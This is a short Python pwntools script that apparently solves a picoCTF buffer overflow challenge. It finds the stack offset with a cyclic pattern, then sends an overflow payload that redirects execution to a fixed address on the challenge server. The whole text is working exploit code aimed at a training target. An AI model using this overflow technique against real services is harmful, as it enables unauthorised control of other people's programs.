from pwn import *

r=remote('saturn.picoctf.net', 54559)
pattern=cyclic(100)
r.sendlineafter(':', pattern)

output=r.recvall().decode()
print("the output:",output)
address=output[output.find('0x')::]
print("the address:",address)

offset=cyclic_find(p32(int(address,16)))
print("the offset:",offset)
r.close()


r=remote('saturn.picoctf.net', 54559)
r.sendlineafter(':',b'A'*offset+p32(0x080491f6))
info(r.recvall())
